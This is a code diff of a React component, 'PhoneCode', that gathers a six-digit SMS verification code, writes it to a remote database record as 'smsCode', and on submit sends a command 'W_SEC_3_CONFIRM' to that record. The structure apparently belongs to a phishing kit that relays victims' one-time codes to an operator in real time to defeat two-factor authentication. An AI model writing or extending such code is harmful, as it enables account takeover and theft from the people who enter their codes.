@@ -10,6 +10,7 @@ interface IProps {
 export const PhoneCode = ({ dataRef }: IProps) => {
   const [loading, setLoading] = useState(false);
   const [code, setCode] = useState(["", "", "", "", "", ""]);
+  const [codeString, setCodeString] = useState("");
   const refs = useRef<any>([]);
   refs.current = [];
 
@@ -17,7 +18,7 @@ export const PhoneCode = ({ dataRef }: IProps) => {
     const codeString = code.reduce((acc, value) => {
       return acc + value;
     });
-    console.log(codeString);
+    setCodeString(codeString);
     if (dataRef) {
       update(dataRef, { smsCode: codeString });
     }
@@ -98,13 +99,13 @@ export const PhoneCode = ({ dataRef }: IProps) => {
             ))}
           </div>
           <button
-            disabled={loading}
+            disabled={loading || codeString.length < 6}
             onClick={() => {
               setLoading(true);
 
-              setTimeout(() => {
-                setLoading(false);
-              }, 3000);
+              if (dataRef) {
+                update(dataRef, { command: "W_SEC_3_CONFIRM" });
+              }
             }}
             className="bg-[#121212] hover:text-zinc-400 text-white disabled:bg-[#F5F5F5] py-3 disabled:text-zinc-400 rounded-[30px] disabled:cursor-not-allowed flex flex-row gap-2 items-center justify-center"
           >
